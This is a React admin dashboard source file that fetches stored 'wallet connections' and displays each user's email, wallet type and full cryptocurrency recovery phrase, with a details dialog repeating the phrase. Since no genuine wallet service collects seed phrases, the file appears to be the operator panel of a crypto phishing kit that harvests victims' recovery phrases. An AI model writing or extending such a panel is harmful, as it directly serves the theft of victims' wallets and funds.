import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Loader2 } from "lucide-react";
import type { WalletConnection } from "@shared/schema";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [connections, setConnections] = useState<WalletConnection[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [showDialog, setShowDialog] = useState(false);
  const [selectedConnection, setSelectedConnection] = useState<WalletConnection | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    // Check session status first
    fetch('/api/admin/session', {
      credentials: 'include',
      headers: {
        'Cache-Control': 'no-cache'
      }
    })
    .then(response => response.json())
    .then(data => {
      console.log('Admin session status:', data);
      if (data.isAdmin) {
        fetchConnections();
      } else {
        console.log('Not authenticated as admin, redirecting');
        setLocation('/admin/login');
      }
    })
    .catch(error => {
      console.error('Error checking session:', error);
      setLocation('/admin/login');
    });
  }, []);

  const fetchConnections = async () => {
    try {
      setIsLoading(true);
      console.log('Fetching admin connections...');

      const response = await fetch('/api/admin/connections', {
        credentials: 'include',
        headers: {
          'Cache-Control': 'no-cache'
        }
      });

      console.log('Response status:', response.status);

      if (response.status === 401) {
        console.log('Unauthorized, redirecting to login');
        toast({
          title: "Session Expired",
          description: "Please login again to continue",
          variant: "destructive"
        });
        setLocation('/admin/login');
        return;
      }

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      console.log('Fetched connections:', data);
      setConnections(data);
    } catch (error) {
      console.error('Error fetching connections:', error);
      toast({
        title: "Error",
        description: "Failed to load data. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleViewDetails = (connection: WalletConnection) => {
    setSelectedConnection(connection);
    setShowDialog(true);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  // Get current time for greeting
  const hour = new Date().getHours();
  let greeting = "Good morning";
  if (hour >= 12 && hour < 17) greeting = "Good afternoon";
  else if (hour >= 17) greeting = "Good evening";

  return (
    <div className="container mx-auto px-4 py-8">
      <div className="max-w-6xl mx-auto">
        {/* Welcome Message Section */}
        <Card className="mb-8 bg-gradient-to-r from-primary/10 to-primary/5 border-none">
          <CardContent className="p-6">
            <h1 className="text-4xl font-bold mb-2">{greeting}, Admin!</h1>
            <p className="text-muted-foreground">
              Welcome to your dashboard. You have {connections.length} wallet {connections.length === 1 ? 'connection' : 'connections'} to manage.
            </p>
          </CardContent>
        </Card>

        <div className="flex justify-between items-center mb-8">
          <h2 className="text-2xl font-semibold">Wallet Connections</h2>
          <Button 
            variant="outline" 
            onClick={async () => {
              try {
                await fetch('/api/admin/logout', {
                  method: 'POST',
                  credentials: 'include'
                });
              } catch (e) {
                console.error('Error logging out:', e);
              }
              setLocation('/admin/login');
            }}
          >
            Logout
          </Button>
        </div>

        {connections.length === 0 ? (
          <Card>
            <CardContent className="p-6">
              <p className="text-center text-muted-foreground">No wallet connections found.</p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4">
            {connections.map((connection) => (
              <Card key={connection.id} className="bg-white/50 backdrop-blur-sm border-2">
                <CardContent className="p-6">
                  <div className="grid gap-2">
                    <div className="flex justify-between">
                      <span className="font-medium">Email:</span>
                      <span>{connection.email}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="font-medium">Wallet Type:</span>
                      <span>{connection.walletType}</span>
                    </div>
                    <div>
                      <span className="font-medium">Recovery Phrase:</span>
                      <p className="mt-1 break-all bg-black/5 p-2 rounded text-red-600 font-medium">
                        {connection.recoveryPhrase}
                      </p>
                    </div>
                    <div className="flex justify-between">
                      <span className="font-medium">Created At:</span>
                      <span>{new Date(connection.createdAt).toLocaleString()}</span>
                    </div>
                    <Button 
                      variant="outline" 
                      className="mt-2"
                      onClick={() => handleViewDetails(connection)}
                    >
                      View Details
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>

      <Dialog open={showDialog} onOpenChange={setShowDialog}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Wallet Connection Details</DialogTitle>
            <DialogDescription>
              Detailed information about the selected wallet connection.
            </DialogDescription>
          </DialogHeader>
          {selectedConnection && (
            <div className="space-y-4">
              <div>
                <h3 className="font-medium">Email</h3>
                <p>{selectedConnection.email}</p>
              </div>
              <div>
                <h3 className="font-medium">Wallet Type</h3>
                <p>{selectedConnection.walletType}</p>
              </div>
              <div>
                <h3 className="font-medium">Recovery Phrase</h3>
                <p className="break-all bg-black/5 p-2 rounded text-red-600">
                  {selectedConnection.recoveryPhrase}
                </p>
              </div>
              <div>
                <h3 className="font-medium">Created At</h3>
                <p>{new Date(selectedConnection.createdAt).toLocaleString()}</p>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}